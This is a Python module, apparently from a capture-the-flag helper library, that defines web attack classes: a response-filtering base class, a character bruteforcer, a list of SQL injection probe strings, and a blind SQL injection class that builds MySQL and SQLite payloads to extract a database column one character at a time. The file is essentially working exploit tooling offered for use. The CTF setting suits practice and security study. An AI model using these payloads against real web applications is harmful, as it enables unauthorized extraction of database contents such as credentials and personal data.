import string
import typing

from ctflib.web.backend import Response
from ctflib.web.context import context


class Attack:
    responses: typing.List[Response]
    negative_response1: Response = None
    negative_response2: Response = None
    store_responses = False

    def __init__(self):
        self.responses = []

    def items(self) -> typing.List:
        raise NotImplementedError()

    def handle(self, response: Response, position: int):
        if position == 0:
            self.negative_response1 = response
        elif position == 1:
            self.negative_response2 = response
        elif self.store_responses:
            self.responses.append(response)

    def filter(self, response: Response) -> bool:
        if response == self.negative_response1 or response == self.negative_response2:
            return False
        if response.status not in [self.negative_response1.status, self.negative_response2.status]:
            return True
        # Likely false positive if the negative response is not constant
        if self.negative_response1.text != self.negative_response2.text:
            return False
        return response.text != self.negative_response1.text or response.text != self.negative_response2.text

    @staticmethod
    def extract(inputs: typing.List[typing.Any], response: Response) -> str:
        return inputs[0]


class Bruteforce(Attack):
    def __init__(self, charset: str | typing.List[str] | typing.List[typing.Tuple] = string.printable,
                 format_string="FUZZ"):
        super().__init__()
        self.charset = charset
        self.format_string = format_string

    def items(self) -> typing.List:
        request_items = []
        for char in self.charset:
            if isinstance(char, str):
                request_items.append(self.format_string.replace("FUZZ", char))
            else:
                item = self.format_string
                for i, x in enumerate(char):
                    item = item.replace(f"FUZZ{i}", x)
                request_items.append(item)
        return [context.not_found, context.not_found2] + request_items


class SQLInjection(Attack):
    def __init__(self):
        super().__init__()
        self.words = ["'", "--", ";", "\"", "\\", "`", "' or 1=1 or '", "\" or 1=1 or \""]

    def items(self) -> typing.List:
        return [context.not_found, context.not_found2] + self.words


class BlindSQLI(Bruteforce):
    def __init__(self, column_name, flavor="sqlite", charset=string.ascii_letters + string.digits + "{}[]().*_",
                 conditions: str = "", length=0):
        # Dump 1 character
        if length == 0:
            if flavor == "mysql":
                format_string = f"\" or (ASCII(SUBSTRING({column_name},1,1)) = FUZZ {conditions}) or \""
                super().__init__([str(ord(x)) for x in charset], format_string)
            elif flavor == "sqlite":
                format_string = f"' or (SUBSTRING({column_name},1,1) = 'FUZZ' {conditions}) or '"
                super().__init__(charset, format_string)
        else:
            # Dump a bunch of characters asynchronously
            if flavor == "mysql":
                format_string = f"\" or (ASCII(SUBSTRING({column_name},FUZZ0,1)) = FUZZ1 {conditions}) or \""
                items = []
                for i in range(length):
                    items.extend([(str(i), str(ord(x))) for x in charset])
                super().__init__(items, format_string)
            elif flavor == "sqlite":
                format_string = f"' or (SUBSTRING({column_name},FUZZ0,1) = 'FUZZ1' {conditions}) or '"
                items = []
                for i in range(length):
                    items.extend([(str(i), x) for x in charset])
                super().__init__(items, format_string)

    @staticmethod
    def extract(inputs: typing.List[typing.Any], response: Response) -> str:
        i = inputs[0]
        # Mysql version
        if "ASCII" in i:
            return chr(int(i.split(")) =")[1].split(" ")[0]))
        else:
            # Sqlite version
            return i.split(") = '")[1].split("'")[0]
